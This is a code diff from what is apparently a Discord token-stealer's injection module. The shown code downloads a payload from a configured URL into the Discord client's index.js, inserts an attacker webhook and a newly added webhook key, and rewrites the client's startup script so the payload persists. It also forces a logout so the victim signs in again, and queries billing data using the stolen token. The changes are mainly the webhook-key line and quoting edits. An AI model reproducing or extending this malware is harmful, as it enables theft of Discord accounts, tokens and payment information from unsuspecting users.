@@ -115,6 +115,7 @@ async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJs);
         res.replace('%WEBHOOK%', '${config.webhook}')
+        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
         res.pipe(file);
         file.on('finish', () => {
             file.close();
@@ -124,17 +125,18 @@ async function init() {
         setTimeout(init(), 10000);
     });
 }
-require('${path.join(resourcePath, "app.asar")}')
+require('${path.join(resourcePath, 'app.asar')}')
 if (fs.existsSync(bdPath)) require(bdPath);`;
-    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, "\\\\"));
+    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
   }
-  if (!fs.existsSync(path.join(__dirname, "initiation"))) return !0;
-  fs.rmdirSync(path.join(__dirname, "initiation"));
+  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
+  fs.rmdirSync(path.join(__dirname, 'initiation'));
   execScript(
     `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
   );
   return !1;
 }
+
 
 const execScript = (script) => {
   const window = BrowserWindow.getAllWindows()[0];
@@ -156,7 +158,7 @@ const fetchBilling = async (token) => {
     xmlHttp.setRequestHeader("Authorization", "${token}"); 
     xmlHttp.send(null); 
     xmlHttp.responseText`);
-  if (!bill.lenght || bill.length === 0) return "";
+  if (!bill.lenght || bill.length === 0) return '';
   return JSON.parse(bill);
 };
 
